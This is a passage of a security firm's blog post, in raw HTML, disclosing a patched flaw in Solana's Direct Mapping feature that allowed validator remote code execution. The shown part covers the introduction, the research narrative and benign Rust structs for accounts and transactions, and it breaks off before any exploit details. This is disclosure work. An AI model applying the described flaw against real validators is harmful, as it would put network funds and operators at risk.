<!DOCTYPE html><!--K_UlvW_EZvJxoOcEoVeM7--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/3d26d2f3aa81a833-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/4b657decd6407698-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/6e1768769e6f59a2-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/739c2d8941231bb4-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/ab2e3a11646b0499-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="/logo.png"/><link rel="preload" as="image" href="/blog/solana_cover.png"/><link rel="preload" as="image" href="/blog/2025_06_27/single_program_memory_layout.png"/><link rel="preload" as="image" href="/blog/2025_06_27/cpi_call.png"/><link rel="preload" as="image" href="/blog/2025_06_27/cpi_return.png"/><link rel="preload" as="image" href="/blog/2025_06_27/legacy_memoryregion.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_memoryregion.png"/><link rel="preload" as="image" href="/blog/2025_06_27/copy_on_write.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_cpi_call.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_cpi_return.png"/><link rel="stylesheet" href="/_next/static/css/8eb65cd440904aa0.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-5b44a6e81d516c51.js"/><script src="/_next/static/chunks/4bd1b696-c023c6e3521b1417.js" async=""></script><script src="/_next/static/chunks/255-293e44824f2ec188.js" async=""></script><script src="/_next/static/chunks/main-app-7c47e34ac25069a8.js" async=""></script><script src="/_next/static/chunks/894-e85ac7d5aa9f4e1d.js" async=""></script><script src="/_next/static/chunks/250-d31dac9ddbb4fbd7.js" async=""></script><script src="/_next/static/chunks/app/blog/%5Bslug%5D/page-2a522a9a319ee009.js" async=""></script><link rel="preload" as="image" href="/blog/2025_06_27/memoryregion_update.png"/><meta name="next-size-adjust" content=""/><title>Anatomist Security – Web3 / Blockchain Audit Experts</title><meta name="description" content="Seasoned security researchers providing deep‑dive smart‑contract &amp; blockchain infrastructure audits, fuzzing and consulting."/><meta name="keywords" content="smart contract audit,blockchain security,web3,eth,solidity,vyper,solana,audit,pentest"/><link rel="canonical" href="https://anatomi.st/blog/2025_06_27_pwning_solana_for_fun_and_profit"/><meta property="og:title" content="Anatomist Security – Web3 Audit Experts"/><meta property="og:description" content="Battle‑tested researchers securing billions in on‑chain value."/><meta property="og:url" content="https://anatomi.st"/><meta property="og:site_name" content="Anatomist Security"/><meta property="og:locale" content="en_US"/><meta property="og:image" content="https://anatomi.st/og-cover.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@th3anatomist"/><meta name="twitter:creator" content="@th3anatomist"/><meta name="twitter:title" content="Anatomist Security – Web3 Audit Experts"/><meta name="twitter:description" content="Battle‑tested researchers securing billions in on‑chain value."/><meta name="twitter:image" content="https://anatomi.st/og-cover.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="32x32"/><link rel="icon" href="/favicon.ico"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_4fe6d1 __variable_606fa7 antialiased"><div hidden=""><!--$--><!--/$--></div><header class="fixed inset-x-0 top-0 z-30 transition-all duration-300 ease-in-out bg-transparent translate-y-0"><nav class="mx-auto flex max-w-6xl items-center justify-between px-4 py-4 lg:px-8"><a href="/#" aria-label="Anatomist home" class="flex items-center cursor-pointer no-underline group"><div class="relative flex items-center gap-3"><span class="text-xs tracking-[0.3em] text-white/40 font-mono">::</span><img alt="Anatomist Security" width="140" height="32" decoding="async" data-nimg="1" class="h-8 w-auto object-contain opacity-80 group-hover:opacity-100 transition-opacity" style="color:transparent" src="/logo.png"/></div></a><div class="hidden items-center gap-1 lg:flex"><a href="#about" class="px-4 py-2 text-xs font-mono tracking-widest text-white/60 hover:text-white cursor-pointer transition-all duration-300 no-underline uppercase">[ <!-- -->ABOUT<!-- --> ]</a><a href="#services" class="px-4 py-2 text-xs font-mono tracking-widest text-white/60 hover:text-white cursor-pointer transition-all duration-300 no-underline uppercase">[ <!-- -->SERVICES<!-- --> ]</a><a href="/blog" class="px-4 py-2 text-xs font-mono tracking-widest text-white/60 hover:text-white cursor-pointer transition-all duration-300 no-underline uppercase">[ <!-- -->BLOG<!-- --> ]</a><span class="mx-2 text-white/20">|</span><a href="#contact" class="relative inline-flex items-center gap-2 border border-white/30 hover:border-white hover:bg-white hover:text-black px-5 py-2 transition-all duration-300 cursor-pointer no-underline group"><span class="flex items-center text-xs font-mono font-medium tracking-widest text-white group-hover:text-black uppercase">INITIATE_CONTACT<span class="ml-2 transition-transform group-hover:translate-x-1">→</span></span></a></div><button aria-label="toggle menu" class="cursor-pointer text-white/70 hover:text-white lg:hidden transition-colors"><span class="font-mono text-sm tracking-widest">[ = ]</span></button></nav><aside class="fixed top-0 z-10 h-screen w-64 max-w-64 bg-black/95 backdrop-blur-xl border-l border-white/10 transition-[right] duration-300 ease-in-out lg:hidden -right-64"><div class="flex h-full flex-col items-start p-8"><div class="w-full mb-8 pb-4 border-b border-white/10"><span class="text-xs tracking-[0.3em] text-white/20 font-mono">:: NAVIGATION</span></div><button aria-label="close menu" class="mb-8 cursor-pointer self-end text-sm font-mono tracking-widest text-white/50 hover:text-white transition-colors">[ CLOSE ]</button><ul class="inline-flex flex-col gap-4 w-full"><li><a href="#about" class="block px-2 py-3 text-sm font-mono tracking-widest text-white/70 hover:text-white cursor-pointer transition-all duration-300 uppercase"><span class="text-white/30 mr-2">0<!-- -->1<!-- -->.</span>ABOUT</a></li><li><a href="#services" class="block px-2 py-3 text-sm font-mono tracking-widest text-white/70 hover:text-white cursor-pointer transition-all duration-300 uppercase"><span class="text-white/30 mr-2">0<!-- -->2<!-- -->.</span>SERVICES</a></li><li><a href="/blog" class="block px-2 py-3 text-sm font-mono tracking-widest text-white/70 hover:text-white cursor-pointer transition-all duration-300 uppercase"><span class="text-white/30 mr-2">0<!-- -->3<!-- -->.</span>BLOG</a></li><li class="mt-4"><a href="#contact" class="relative inline-flex cursor-pointer items-center gap-2 border border-white/30 hover:border-white hover:bg-white hover:text-black px-4 py-3 transition-all duration-300 no-underline group w-full justify-center"><span class="flex items-center text-xs font-mono font-medium tracking-widest text-white group-hover:text-black uppercase">INITIATE_CONTACT<span class="ml-2 transition-transform group-hover:translate-x-1">→</span></span></a></li></ul><div class="mt-auto w-full pt-8 border-t border-white/10"><span class="text-xs tracking-[0.2em] text-white/30 font-mono block">STATUS: ONLINE</span><span class="text-xs tracking-[0.2em] text-white/30 font-mono block mt-1">VER: 2.0.1</span></div></div></aside></header><main class="relative isolate bg-[#050505] px-6 py-24 pt-32 sm:py-32 lg:px-8 min-h-screen"><div class="absolute inset-0 bg-grid-pattern opacity-30 pointer-events-none"></div><div class="relative mx-auto max-w-4xl"><article class="prose prose-invert prose-lg lg:prose-xl max-w-none"><div class="mb-12 pb-8 border-b border-white/10"><a class="inline-flex items-center gap-2 text-xs tracking-[0.2em] text-white/40 hover:text-white transition-colors mb-8 font-mono uppercase no-underline group" href="/blog"><span class="transition-transform group-hover:-translate-x-1">←</span>BACK_TO_BLOG</a><div class="relative"><div class="absolute -top-4 -left-4 w-6 h-6 border-l-2 border-t-2 border-white/30"></div><div class="absolute -top-4 -right-4 w-6 h-6 border-r-2 border-t-2 border-white/30"></div><h1 class="text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight text-white text-glow-strong leading-tight py-4">Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing</h1></div><div class="mt-6 flex flex-wrap items-center gap-4 text-xs font-mono"><div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-white animate-pulse"></span><span class="tracking-[0.2em] text-white/40 uppercase">:: BLOG_POST</span></div><span class="text-white/20">|</span><time dateTime="2025-06-27T00:00:00.000Z" class="tracking-[0.15em] text-white/60">[<!-- -->2025.06.27<!-- -->]</time><span class="text-white/20">|</span><span class="tracking-[0.15em] text-white/60 uppercase">AUTHOR: <!-- -->anatomist</span></div><div class="mt-8 border border-white/10 overflow-hidden"><img src="/blog/solana_cover.png" alt="Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing" class="w-full h-auto object-cover"/></div></div><style>
                @import url('https://fonts.googleapis.com/css2?family=Hind:wght@300;400;500;600;700&display=swap');

                .prose-content {
                  font-family: 'Hind', sans-serif;
                }

                mjx-container[jax="SVG"] > svg {
                  display: inline !important;
                }
                mjx-container[display="true"] {
                  padding: 0 4px;
                  border: 1px solid rgba(255, 255, 255, 0.2);
                  border-radius: 4px;
                }
              </style><div class="prose-content"><h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">The Road to RCE</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">In this blog, we examine the Direct Mapping optimization first introduced in Solana version 1.16. Our research revealed a critical vulnerability caused by an oversight in pointer management, ultimately allowing us to achieve <strong class="font-semibold text-white">full remote code execution (RCE) on a validator node</strong>. This feature was never enabled on mainnet, but had this flaw gone unpatched, it could have compromised the entire Solana network—putting what is today <strong class="font-semibold text-white">over $9 billion in total value locked (TVL)</strong> at risk.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">In addition to diving into vulnerability details, we want to also <strong class="font-semibold text-white">demystify the bug-hunting process</strong> in this blog. As fascinating as it is to read about all the astonishing findings published by security researchers, rarely do we get a glimpse at the thought process behind. The path to discovering a critical bug is often marked by dead ends, intuition, curiosity, and deep system internals knowledge. By walking through our initial observations and narrowing down the actual vulnerability, we hope to shed light on what real-world vulnerability research looks like.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Before we start, if you&#x27;re primarily interested in the technical discussions, skip ahead to the <a class="text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white" target="_blank" rel="noopener noreferrer" href="#Setting-the-Stage-A-Primer-on-Solanas-Execution-Environment">Setting the Stage: A Primer on Solana&#x27;s Execution Environment</a> section, where we discuss the background knowledge required to understand the bug. If you know your way around Solana internals and just want to read about the bug, you can jump directly to <a class="text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white" target="_blank" rel="noopener noreferrer" href="#The-Vulnerability">The Vulnerability</a> section. Otherwise, sit back and join us as we revisit this rollercoaster of a journey. :)</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">Very Long Story, Hopefully Short Enough</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Many blockchains have embraced modern programming languages like Rust and Go, which are often seen as safer alternatives to lower-level options like C or C++. While language choice is sometimes a matter of taste, it significantly shapes a protocol’s security profile. Solana uses Rust, a language renowned for memory safety and object lifetime management.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">But of course, no software is impenetrable. Even before we discovered the RCE vulnerability, our dissection of Solana had already uncovered several validator mismatch bugs that could compromise the chain&#x27;s liveness. These ranged from non-deterministic execution across multiple validators to misconfigurations in feature gating that led to unsynchronized upgrades. All of which indicate that <strong class="font-semibold text-white">Solana isn’t bulletproof</strong>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Most of the bugs we previously found leans more to the business logic side. After getting several of these, we are no longer satisfied with unveiling just another business logic bug. We want something deeper, something buried deep in Solana&#x27;s system internals—<strong class="font-semibold text-white">the kind you uncover only through the most meticulous anatomy</strong>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">One target we set sight on is the removal of memory address translation, which seems like a powerful, but extremely dangerous optimization. Unfortunately, this feature never materialized.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">While we&#x27;re keeping watch of the address translation feature, we started exploring adjacent parts of the codebase. It wasn&#x27;t long before we stumbled upon another interesting feature called Direct Mapping. And it was in this feature we discovered the kind of vulnerability we&#x27;re looking for, one with the potential to <strong class="font-semibold text-white">compromise the entire blockchain</strong>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">As you might already know, <strong class="font-semibold text-white">every performance optimization carries the risk of introducing vulnerabilities</strong>. The intuitive way to manage VM memory is to isolate it completely from the host running it. This ensures safety but sometimes introduces performance hits. Attempting to eliminate this isolation for speed, while still maintaining security, is ambitious and inherently <strong class="font-semibold text-white">risky</strong>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Solana began developing the optimization starting with Direct Mapping, especially during Cross-Program Invocations (CPI), when programs must serialize and copy large amounts of account data, resulting in significant execution overhead. The new Direct Mapping mechanism introduced in Solana v1.16 aimed to eliminate unnecessary copying. Account data buffers are directly mapped into VM memory with the pointers dynamically updated rather than copying the entire data. However, this optimization required strict runtime validation of pointers during these dynamic updates, which was inadequately implemented and ultimately introduced the vulnerability.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The vulnerability was powerful, but unfortunately, our exploit hit an unexpected wall thanks to an unrelated patch. After some hard work navigating the new limitations, we ultimately managed to craft a working exploit. Now, if you&#x27;re ready, let&#x27;s dive into the technical details.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">Setting the Stage: A Primer on Solana&#x27;s Execution Environment</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">To analyze the security of a system, we first need to understand how it works. Solana is heavily optimized for performance, more specifically, parallel execution of transactions, and requires extra care to prevent race conditions or non-determinism issues that may lead to liveness failures. This results in an object oriented design that incorporating Solana&#x27;s unique data storage and transaction models.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">The Solana Account Model</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">In Solana, everything is stored in what are called <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Accounts</code>. You can think of the entire state of the Solana blockchain as a giant key-value store, where the &quot;key&quot; is an <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Address</code> (a <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Pubkey</code>) and the &quot;value&quot; is the account data itself.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">An <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Account</code> holds several information, most importantly, it tracks the amount of native tokens an account has (<code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">lamports</code>), the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">owner</code> of the account, and an opaque <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">data</code> field.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Account</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Native token balance</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Variable-length state data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Program authorized to modify this account</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// Whether this account contains executable code</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Epoch</span><span class="token token" style="color:#ccc">,</span><span>    </span><span class="token token" style="color:#999">// Rent tracking information</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">data</code> field is where the magic happens. For a simple wallet account, this might be empty. But for an account owned by a program, this byte array holds all of its state. The structure of this data is defined by each program. This <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">data</code> field is the central component of our story.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Transaction and Instruction Flow</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">To take full advantage of storing data as <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Account</code>, Solana <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Transaction</code> specify upfront which accounts it intends to access, as well as how it intends to access the accounts (read only or read + write). This allows validators to check if different transactions has overlapping storage access, and decide on whether it is safe to schedule transactions for execution in parallel.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Transaction</code> can also include multiple <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instruction</code>, each of which is a contract call. This provides a scripting capability for users to perform complex operations in a single transaction. The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code> in a <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Transaction</code> are executed sequentially and atomically.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Transaction</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> signatures</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Signature</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> message</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Message</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Message</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> header</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">MessageHeader</span><span class="token token" style="color:#ccc">,</span><span>                    </span><span class="token token" style="color:#999">// Access type (read / write) of each accessed account</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> account_keys</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>                </span><span class="token token" style="color:#999">// Accounts accessed by the transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> instructions</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">CompiledInstruction</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// Actions performed by the transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MessageHeader</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_required_signatures</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_readonly_signed_accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_readonly_unsigned_accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
